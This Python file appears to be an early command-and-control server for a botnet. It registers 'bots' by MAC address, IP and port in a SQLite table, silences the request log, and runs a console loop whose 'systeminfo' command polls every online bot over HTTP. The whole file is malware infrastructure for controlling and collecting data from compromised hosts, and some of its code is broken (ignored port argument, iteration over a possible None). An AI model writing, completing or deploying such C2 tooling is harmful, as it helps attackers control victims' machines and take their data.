from flask import Flask, request
from werkzeug.serving import make_server
import threading
import sqlite3
import logging
import requests
import json

con = None
server = None
db = None

def main():
    global server, db
    server = Server(5000)
    db = DB()
    server.run()
    log = logging.getLogger('werkzeug')
    log.disabled = True
    mainLoop()
    

def mainLoop():
    while True:
        command = input("> ")
        match command.lower():
            case "systeminfo":
                res = db.execute("SELECT ip_address, listening_port FROM bots WHERE online = true")
                for client in res:
                    print(requests.get(f"http://{client['ip_address']}:{client['listening_port']}/systeminfo").text)

class Server:
    app = Flask(__name__)

    def __init__(self, port):
        self.port = port

    def run(self):
        server = make_server('0.0.0.0', 5000, self.app)
        threading.Thread(target = lambda: server.serve_forever()).start()
        
    @app.route('/register', methods = ['POST'])
    def registerBot():
        json = request.get_json()
        macaddress = json['mac-address']
        ipaddr = request.remote_addr
        port = json['running-port']
        db.execute("INSERT OR REPLACE INTO bots (mac_address, ip_address, listening_port) VALUES (?,?,?)", macaddress, ipaddr, port)
        return "", 200

class DB:
    con = sqlite3.connect('./bots.sqlite', check_same_thread=False)

    def __init__(self):
        self.con.row_factory = sqlite3.Row
        cur = self.con.cursor()
        cur.execute("PRAGMA foreign_keys = ON;")
        cur.execute('''
            CREATE TABLE IF NOT EXISTS bots (
            mac_address TEXT NOT NULL PRIMARY KEY,
            ip_address TEXT NOT NULL,
            listening_port INTEGER NOT NULL,
            online BOOLEAN DEFAULT TRUE,
            last_task TEXT DEFAULT 'connected',
            last_task_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)
        ''')
        cur.close()
        self.con.commit()
    
    def execute(self, query: str, *arg):
        cur = self.con.cursor()
        res = cur.execute(query, arg)
        rows = res.fetchall()
        cur.close()
        self.con.commit()
        if (len(rows) > 0):
            return [dict(i) for i in rows]
        return None


if __name__ == "__main__":
    main()